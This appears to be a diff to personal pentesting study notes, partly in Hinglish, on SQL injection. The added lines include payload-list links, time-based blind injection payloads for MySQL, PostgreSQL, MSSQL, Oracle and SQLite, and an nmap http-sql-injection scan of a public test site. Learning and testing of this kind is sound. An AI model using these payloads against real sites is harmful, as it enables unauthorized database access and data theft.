@@ -2,10 +2,16 @@
 https://www.exploit-db.com/papers/13045          
 https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#SyntaxBasicAttacks 
 
-
+http://www.securityidiots.com/Web-Pentest/SQL-Injection/
 http://www.securityidiots.com/Web-Pentest/SQL-Injection/DIOS-the-SQL-Injectors-Weapon-Upgraded.html 
 
 ye upar wale me link me payloads ye iska in one shot hack hota he reference ke liye musab khan ka video 
+
+
+
+https://medium.com/@ismailtasdelen/sql-injection-payload-list-b97656cfd66b       #payloads he 
+
+
 ------------------------ writeup end ---------------------
 
 
@@ -84,7 +90,28 @@ UNION based attack 	- sql me union command rahtha he usko use karke
 attack karne ka 
 
 
+-------------------------------- time based sql injection --------------------
+In some cases you won't notice any change on the page you are testing. Therefore, a good way to discover blind SQL injections is making the DB perform actions and will have an impact on the time the page need to load.
+Therefore, the we are going to concat in the SQL query an operation that will take a lot of time to complete:
 
+1' + sleep(10)
+1' and sleep(10)
+1' && sleep(10)
+1' | sleep(10)
+
+PostgreSQL (only support string concat)
+1' || pg_sleep(10)
+
+MSQL
+1' WAITFOR DELAY '0:0:10'
+
+Oracle
+1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
+1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)
+
+SQLite
+1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 
 
 
@@ -112,8 +139,12 @@ administrator'--     === payload
 
 
 
+------------------------ sql injection with Nmap --------------- 
+
+NSE script use karke pahele dekhnge ki vulnearable he ki nahi 
 
 
+nmap -sV --script=http-sql-injection www.testphp.vulnweb.com –p 80
 
 
 
